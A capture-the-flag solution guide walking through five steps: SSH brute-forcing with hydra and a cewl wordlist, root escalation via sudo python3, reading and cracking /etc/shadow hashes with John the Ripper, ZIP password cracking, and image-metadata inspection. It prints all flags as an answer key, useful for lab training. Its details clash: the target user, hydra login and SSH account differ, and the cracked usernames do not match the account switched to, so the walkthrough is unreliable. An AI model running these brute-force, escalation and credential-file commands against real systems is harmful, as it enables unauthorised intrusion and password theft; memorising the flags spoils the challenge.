# 5-Step CTF Challenge Solution & Admin Reference Guide

This guide documents the full 5-step solution path using native Kali Linux tools.

---

## Step 1: Web Recon, SSH Brute-Force & Flag 1

1. **Inspect Web Forum (Port 80):**
   ```bash
   curl -s http://<TARGET_IP>
   ```
   * Finding: `dortega` is a honeypot posting `mrortega!`. `nherrera` is the true administrative target.

2. **Scrape Custom Wordlist with `cewl`:**
   ```bash
   cewl http://<TARGET_IP> -w forum_words.txt
   ```

3. **Brute-Force SSH for `nherrera` using `hydra`:**
   ```bash
   hydra -l sys_admin -P forum_words.txt ssh://<TARGET_IP>
   ```
   * **Credential Found:** `nherrera` : `BLACKBOX`

4. **Retrieve Flag 1:**
   ```bash
   ssh sys_admin@<TARGET_IP>
   cat flag1_initial_access.txt
   ```
   * **Result:** `FLAG{1_sys_admin_ssh_access_granted}`

---

## Step 2: Privilege Escalation & Flag 2

1. **Check Sudo Permissions:**
   ```bash
   sudo -l
   ```
   * Output: `(ALL) NOPASSWD: /usr/bin/python3`

2. **Escalate to Root:**
   ```bash
   sudo python3 -c 'import os; os.system("/bin/bash")'
   ```

3. **Retrieve Flag 2:**
   ```bash
   cat /root/flag2_root_access.txt
   ```
   * **Result:** `FLAG{2_root_privilege_escalation_master}`

---

## Step 3: Password Hash Cracking & Flag 3

1. **Unshadow `/etc/passwd` and `/etc/shadow`:**
   ```bash
   unshadow /etc/passwd /etc/shadow > /tmp/unshadowed.txt
   ```

2. **Crack Account Hashes with John the Ripper:**
   ```bash
   john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/unshadowed.txt
   ```
   * Discovered Passwords:
     * `Mrspring`: `sunshine`
     * `Mssummer`: `summer2022`
     * `Msautumn`: `pumpkin`
     * `Mrwinter`: `winter2024`

3. **Switch to Seasonal User & Retrieve Flag 3:**
   ```bash
   su - profile_spring
   cat flag3_account_cracked.txt
   ```
   * **Result:** `FLAG{3_unshadow_password_hash_cracked}`

---

## Step 4: Encrypted ZIP Archive Cracking & Flag 4

1. **Inspect Password Pattern Clue:**
   ```bash
   cat zip_password_clue.txt
   ```
   * Clue: *6 characters: 2 lower, 'S', 3 digits.*

2. **Crack ZIP Password using John or Crunch:**
   ```bash
   # Method A: John Mask Mode
   zip2john flag_archive.zip > zip.hash
   john --mask='?l?lS?d?d?d' zip.hash

   # Method B: Crunch Wordlist Generator
   crunch 6 6 -t @@S%%% > zip_words.txt
   john --wordlist=zip_words.txt zip.hash
   ```

3. **Extract Archive & Retrieve Flag 4:**
   ```bash
   unzip flag_archive.zip
   cat flag4_zip_unlocked.txt
   ```
   * **Result:** `FLAG{4_zip_archive_pattern_unlocked}`

---

## Step 5: Image Metadata Forensics & Flag 5 (Final Victory)

1. **Analyze Image Metadata using `exiftool` or `strings`:**
   ```bash
   exiftool congrats.jpg
   # OR
   strings congrats.jpg | grep "FLAG{"
   ```
   * **Result:** `FLAG{5_congrats_image_metadata_ctf_champion}`